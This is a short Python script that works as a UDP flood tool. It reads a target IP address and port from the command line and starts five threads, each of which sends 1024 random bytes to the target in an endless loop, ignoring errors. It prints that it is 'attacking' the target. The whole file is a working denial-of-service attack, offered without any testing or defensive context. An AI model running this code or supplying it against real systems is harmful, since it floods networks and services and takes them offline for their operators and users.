from threading import Thread
import sys
import os
import socket


class Udp(object):
    def __init__(self, ip="0.0.0.0", port=80):
        self.target = dict()
        self.target['ip'] = ip
        self.target['port'] = int(port)

    def _sock_send(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet_size = os.urandom(1024)
        while True:
            try:
                sock.sendto(packet_size, (self.target['ip'], self.target['port']))
            except socket.error:
                pass

    def sock_loop(self, thread):        
        print("udp sock_loop attacking on %s:%d..." % (self.target['ip'], self.target['port']))        
        for i in range(thread):            
            t = Thread(target=self._sock_send)            
            t.start()

if __name__ == '__main__':    
    u = Udp(sys.argv[1], sys.argv[2])
    u.sock_loop(5)
